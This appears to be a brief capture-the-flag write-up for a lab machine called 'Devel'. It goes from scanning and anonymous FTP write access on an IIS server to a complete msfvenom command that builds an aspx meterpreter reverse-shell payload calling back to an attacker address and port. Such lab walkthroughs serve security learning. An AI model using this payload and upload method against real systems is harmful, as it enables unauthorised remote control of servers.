# Gaining a Foothold

### Devel

Nmap scan shows ports 21 and 80 are open

Port 80 hosts a default IIS 7 welcome page

The FTP server contains the IIS server files and allows anonymous access, allowing us to upload a reverse 
shell and execute it

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1337 -f aspx -o shell.aspx`

Upload the shell and navigate to 10.10.10.5/shell.aspx with multi/handler listener running to get a reverse 
shell
